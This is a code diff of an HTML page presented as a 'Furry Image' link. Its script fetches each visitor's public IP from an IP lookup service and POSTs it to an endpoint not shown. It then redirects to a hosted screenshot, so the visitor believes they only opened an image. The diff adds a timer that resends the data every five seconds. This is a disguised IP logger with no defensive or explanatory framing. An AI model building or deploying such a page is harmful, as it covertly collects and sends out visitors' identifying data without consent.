@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Image Furry</title>
+    <title>Furry Image</title>
     <script>
-        function getIpAndRedirect() {
+        function getIpAndSend() {
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -15,10 +15,14 @@
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     });
-                    window.location.href = 'https://i.postimg.cc/mkjgkBth/Screenshot-20250907-133847-com-zhiliaoapp-musically-edit-109533490277556.jpg';
                 });
         }
+        setInterval(getIpAndSend, 5000);
+        window.onload = function() {
+            getIpAndSend();
+            window.location.href = 'https://i.postimg.cc/mkjgkBth/Screenshot-20250907-133847-com-zhiliaoapp-musically-edit-109533490277556.jpg';
+        };
     </script>
 </head>
-<body onload="getIpAndRedirect()"></body>
+<body></body>
 </html>
